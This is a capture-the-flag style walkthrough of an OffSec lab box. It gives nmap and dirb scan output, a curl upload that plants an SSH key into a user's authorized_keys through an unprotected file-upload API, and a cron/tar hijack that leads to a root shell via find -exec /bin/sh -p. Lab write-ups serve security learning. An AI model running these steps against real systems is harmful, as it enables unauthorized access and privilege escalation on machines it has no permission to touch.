## Nmap scan

```
nmap -sV -p- 192.168.55.249 --open --vv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 14:17 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 14:17
Scanning 192.168.55.249 [2 ports]
Completed Ping Scan at 14:17, 2.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:17
Completed Parallel DNS resolution of 1 host. at 14:17, 0.00s elapsed
Initiating Connect Scan at 14:17
Scanning 192.168.55.249 [65535 ports]
Discovered open port 21/tcp on 192.168.55.249
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.20% done; ETC: 14:20 (0:02:14 remaining)
Discovered open port 25022/tcp on 192.168.55.249
Discovered open port 33414/tcp on 192.168.55.249
Connect Scan Timing: About 42.79% done; ETC: 14:19 (0:01:15 remaining)
Stats: 0:01:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 55.66% done; ETC: 14:19 (0:00:54 remaining)
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 67.47% done; ETC: 14:19 (0:00:38 remaining)
Discovered open port 40080/tcp on 192.168.55.249
Completed Connect Scan at 14:19, 106.47s elapsed (65535 total ports)
Initiating Service scan at 14:19

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
25022/tcp open  ssh     syn-ack OpenSSH 8.6 (protocol 2.0)
33414/tcp open  unknown syn-ack
40080/tcp open  http    syn-ack Apache httpd 2.4.53 ((Fedora))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

## Dirb scan

```
dirb http://192.168.55.249:40080/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 24 14:21:56 2023
URL_BASE: http://192.168.55.249:40080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.55.249:40080/ ----
                                                                             + http://192.168.55.249:40080/cgi-bin/ (CODE:403|SIZE:199)                  
                                                                             ==> DIRECTORY: http://192.168.55.249:40080/images/
+ http://192.168.55.249:40080/index.html (CODE:200|SIZE:1092)               
+ http://192.168.55.249:40080/LICENSE (CODE:200|SIZE:6555)                  
                                                                             ==> DIRECTORY: http://192.168.55.249:40080/styles/
                                                                            
---- Entering directory: http://192.168.55.249:40080/images/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                            
---- Entering directory: http://192.168.55.249:40080/styles/ ----
                                                                             (!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed May 24 14:21:59 2023
DOWNLOADED: 4612 - FOUND: 3

```

```
dirb http://192.168.55.249:33414/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 24 13:52:33 2023
URL_BASE: http://192.168.55.249:33414/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.55.249:33414/ ----
                                                                             + http://192.168.55.249:33414/help (CODE:200|SIZE:137)                      
+ http://192.168.55.249:33414/info (CODE:200|SIZE:98)                       
                                                                               
-----------------
END_TIME: Wed May 24 13:52:41 2023
DOWNLOADED: 4612 - FOUND: 2

```

## directories availabe
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/0ca6ec95-7e76-4eda-9fe5-4507267a85e5)

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/fb6b7da0-7b7c-4b3b-9d32-baa170f5003f)

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5e27e0c9-6e25-4efd-a950-c91193e43f58)

## SSH using authorized_keys
```
curl -i -X POST -H "Content-Type: multipart/form-data" -F file="@id_rsa.pub.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http:/192.168.212.249:33414/file-upload

```
```
ssh -i id_rsa alfredo@<ip> -p 25022
```
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/cce4b937-8584-4993-a22d-2d1b7837b4f3)

- trying to find , how the files got created , so found a cronjobs file (crontab)
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e426c93f-b4fa-4352-9746-7fc0d4293e44)

`/usr/local/bin/backup-flask.sh`
 
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/c189cb72-229e-4542-8a58-5550da22bc69)

- using find command we can able to find what are the bins has sudo permissions, but the find command need permission.

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5d329a13-53de-4018-97b6-44bfa7629609)

- Here the tar command is used , so its runs on the restapi directory , so creating a tar file to make the `find` bin with sudo perm.

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/2b925d2b-6873-4066-99f9-4825985ea580)

- again I forgot to give chmod +x to make the tar as excecutable. :>

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e1583f7e-9df9-4522-bbb4-4ff2bf88d196)

## privilage Escalation

`find . -exec /bin/sh -p \; -quit`

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6d8accea-f672-4ee0-9e3a-73754b259bdb)


